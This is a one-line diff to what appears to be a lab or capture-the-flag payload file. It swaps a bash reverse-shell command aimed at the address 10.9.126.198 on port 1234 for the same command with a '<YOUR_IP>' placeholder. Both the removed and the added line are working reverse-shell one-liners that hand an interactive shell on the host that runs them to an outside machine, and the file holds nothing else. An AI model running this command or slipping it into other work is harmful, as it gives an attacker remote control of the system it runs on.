@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/10.9.126.198/1234 0>&1;
+bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1;
